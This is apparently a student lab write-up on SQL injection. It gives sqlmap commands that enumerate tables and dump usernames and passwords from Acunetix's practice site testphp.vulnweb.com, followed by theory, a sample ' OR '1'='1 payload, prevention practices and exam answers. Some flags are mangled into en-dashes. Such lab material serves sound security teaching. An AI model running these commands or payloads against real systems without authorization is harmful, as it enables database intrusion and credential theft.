***********exp3 sql injection***************


1) open kali Linux



2)open terminal and type         "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart â€“tables"      it will  show tables in database
				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart â€“tables

Explanation:
â€¢ -D database_name: Specifies the database to target.
â€¢ --tables: Lists all tables in the specified database. 




3) In same terminal type       "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users --column"      it will show the table column and datatypes
				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users --column					

Explanation:
â€¢ -T users: Specifies the table to analyze.
â€¢ --columns: Lists column names in the table




4)In same type  "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C uname --dump"   it will show the username entry
				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C uname --dump




5)in same type   "sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C pass â€“dump"  it will show the password entry
				sqlmap -u testphp.vulnweb.com/AJAX/infoartist.php?id=1 -D acuart -T users -C pass â€“dump

Explanation:
â€¢ -C uname, pass: Selects specific columns (username and password).
â€¢ --dump: Dumps data from the selected columns. 

6)done.


*******************THEORY***********************

Aim: To learn simulation of SQL injection attack.

lab outcome:
	Understood the concept and impact of SQL Injection vulnerabilities in web applications.
	Gained hands-on experience using SQLMap to detect and exploit SQL injection flaws.
	Successfully identified vulnerable parameters and extracted database information from a test target.
	Learned the importance of secure coding practices and input validation to prevent injection attacks.


Requirements
â€¢ Kali Linux (or any system with Python installed)
â€¢ SQLMap installed (apt install sqlmap or pip install sqlmap)
â€¢ A target website vulnerable to SQL injection
â€¢ Internet connection (if testing a remote target) 



1. About the URL

The URL http://testphp.vulnweb.com/AJAX/infoartist.php?id=1 points to a publicly available vulnerable web application.
It is hosted by Acunetix for security testing and learning purposes.
It simulates real-world web application vulnerabilities like:
	SQL Injection (SQLi)
	Cross-Site Scripting (XSS)
	Broken Authentication
	File Upload Vulnerabilities, etc.

2. Breaking Down the URL

Part									Description
http									Protocol used to access the web resource.
testphp.vulnweb.com						Domain name of the vulnerable web server.
/AJAX/infoartist.php						Path to a PHP script handling requests.
?id=1								Query string parameter (id) passed to the script with a value of 1.

3. Possible Vulnerability
	The PHP file infoartist.php may accept user input (id) and directly use it in an SQL query like:
	SELECT * FROM artists WHERE id = '$id';
	If input validation and sanitization are missing, it becomes vulnerable to SQL Injection.

4. What is SQL Injection (SQLi)?
	SQL Injection is a web security vulnerability where an attacker manipulates SQL queries by injecting malicious input into an application.

This allows attackers to:
	Access unauthorized data
	Modify or delete data
	Execute administrative operations on the database
	Bypass authentication
	In some cases, achieve remote code execution (RCE)

5. How an Attack Would Work
	Normal input: id=1
	Server runs: SELECT * FROM artists WHERE id = 1;
	Malicious input: id=1' OR '1'='1
	Server may run: SELECT * FROM artists WHERE id = '1' OR '1'='1';
	This condition always evaluates to TRUE, exposing all records.

6. Tools Used for Testing
	Manual testing by inserting payloads into the URL (e.g., ' OR '1'='1).
	Automated tools like:
	sqlmap (for SQL Injection detection and exploitation)
	Burp Suite (for intercepting and modifying web requests)
	OWASP ZAP (for automated vulnerability scanning)

7. Best Practices to Prevent SQL Injection
	Use Prepared Statements (Parameterized Queries).
	Use ORM frameworks (Object Relational Mapping).
	Perform input validation and input sanitization.
	Implement least privilege for database accounts.
	Use Web Application Firewalls (WAFs) for extra protection.

ðŸŽ¯ Final One-Line Summary
"testphp.vulnweb.com is a publicly hosted vulnerable web app used to practice exploiting web security flaws like SQL Injection by injecting malicious inputs into dynamic SQL queries without proper validation."

ðŸ“‹ If They Ask You a Quick Oral Question Like:

Question									Short, Perfect Answer
What is this URL?							A public vulnerable web app for practicing SQL Injection and other attacks.
What is happening at id=1?						The server retrieves artist information based on the id parameter, potentially without sanitization.
How to exploit it?							Inject SQL payloads via id parameter to modify database queries.
How to prevent it?							By using prepared statements and validating user input.
